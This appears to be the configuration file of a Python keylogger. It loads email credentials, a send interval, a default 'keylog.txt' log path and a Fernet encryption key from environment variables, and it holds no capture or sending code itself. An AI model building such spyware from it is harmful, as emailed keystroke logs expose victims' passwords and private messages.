# config.py

from dotenv import load_dotenv
import os
from cryptography.fernet import Fernet

# Load environment variables from .env
load_dotenv()

# === Email Credentials ===
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")

# === Optional Configs ===
SEND_INTERVAL = int(os.getenv("SEND_INTERVAL", 60))  # Default: 60 sec
LOG_FILE = os.getenv("LOG_FILE", "keylog.txt")       # Optional fallback

# === Encryption ===
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY").encode()
fernet = Fernet(ENCRYPTION_KEY)
